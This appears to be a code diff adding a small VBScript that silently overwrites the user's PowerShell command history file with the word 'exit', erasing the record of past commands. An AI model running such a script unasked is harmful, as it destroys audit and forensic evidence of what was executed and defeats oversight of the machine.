@@ -1,0 +1,12 @@
+' On Error Resume Next
+
+Set sh = WScript.CreateObject("WScript.Shell")
+historyFilePath = sh.SpecialFolders("AppData") & "\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
+Set sh = Nothing
+
+Set fso = WScript.CreateObject("Scripting.FileSystemObject")
+Set historyFile = fso.CreateTextFile(historyFilePath, true)
+historyFile.WriteLine "exit"
+historyFile.Close
+Set historyFile = Nothing
+Set fso = Nothing
